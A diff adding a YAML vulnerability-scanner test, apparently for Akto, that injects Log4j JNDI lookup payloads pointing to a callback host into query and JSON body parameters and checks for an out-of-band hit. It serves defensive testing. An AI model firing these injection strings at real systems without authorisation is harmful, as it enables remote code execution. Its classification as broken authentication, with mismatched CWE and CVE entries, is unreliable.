@@ -1,0 +1,101 @@
+id: LOG4J_JSON_PARAM
+info:
+  name: "Log4j vulnerability test on HTTP request parameters : Query Params / JSON body parameters"
+  description: >
+    "Log4j vulnerability testing on HTTP request parameters involves injecting JNDI payloads into query parameters and JSON body fields to identify potential exploitation points. By placing payloads like jndi: in these parameters, testers can observe if the application logs or processes them, potentially triggering DNS lookups. Successful exploitation indicates a vulnerability in the logging mechanism, allowing remote code execution through malicious inputs. Monitoring the controlled URL for incoming requests helps verify the effectiveness of these tests."
+  details: >
+    "To test for Log4j vulnerabilities in HTTP request parameters, inject JNDI payloads into both query parameters and JSON body fields of API requests. For example, include payloads like jndi: in the URL or JSON data. If the application logs or processes these parameters, it may initiate a DNS lookup to the specified URL, indicating a vulnerability. Monitoring the controlled URL for incoming requests can help verify whether the application is susceptible to exploitation through these injection points."
+  impact: >
+    "The impact of exploiting Log4j vulnerabilities through HTTP request parameters can be severe, allowing attackers to execute arbitrary code on the server. Successful exploitation can lead to unauthorized access, data breaches, and the ability to deploy malware or control affected systems remotely. Additionally, the vulnerability can facilitate lateral movement within the network, compromising other connected systems. This risk underscores the importance of securing logging mechanisms and validating user inputs to prevent such attacks."
+
+  category:
+    name: NO_AUTH
+    shortName: Broken Authentication
+    displayName: Broken User Authentication (BUA)
+  subCategory: LOG4J_JSON_PARAM
+  severity: MEDIUM
+  tags:
+    - Business logic
+    - OWASP top 10
+    - HackerOne top 10
+  references:
+    - "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/"
+    - "https://github.com/OWASP/API-Security/blob/master/editions/2023/en/0xa2-broken-authentication.md"
+    - "https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html"
+  cwe:
+    - CWE-287
+  cve:
+    - CVE-2020-24008
+    - CVE-2021-45901
+attributes:
+  nature: INTRUSIVE
+  plan: PRO
+  duration: FAST
+
+
+wordLists:
+  jndi1:
+    - $
+api_selection_filters:
+  response_code:
+    gte: 200
+    lt: 300
+  method:
+    neq: "OPTIONS"
+  response_payload:
+    length:
+      gt: 0
+    not_contains:
+      - Error
+      - Internal Server
+      - Failed
+      - Unauthorized
+      - access denied
+      - Forbidden
+      - Method Not allowed
+      - Gateway timeout
+      - request timeout
+      - server error
+      - server busy
+      - authentication error
+      - authorization error
+      - validation error
+      - Permission Denied
+      - invalid token
+      - token expired
+      - session expired
+      - session timeout
+      - unexpected error
+      - unable to process request
+      - bad request
+      - service unavailable
+      - account is locked
+      - account is blocked
+      - multiple failed attempts
+  or:
+    - request_payload:
+        for_one:
+          key:
+            regex: ".*"
+            extract: bodyKey
+    - query_param:
+        for_one:
+          key:
+            regex: ".*"
+            extract: queryKey
+
+execute:
+  type: single
+  requests:
+    - req:
+        - send_ssrf_req:
+            url: "https://test-services.akto.io/store_uuid/3523ddf7-51ef-462b-a452-f33246aae6bb"
+        - modify_body_param:
+            bodyKey: "${jndi1}{jndi:https://test-services.akto.io/3523ddf7-51ef-462b-a452-f33246aae6bb}"
+        - modify_query_param:
+            queryKey: "${jndi1}{jndi:https://test-services.akto.io/3523ddf7-51ef-462b-a452-f33246aae6bb}"
+validate:
+  response_payload:
+    length:
+      gt: 0
+  ssrf_url_hit: "3523ddf7-51ef-462b-a452-f33246aae6bb"
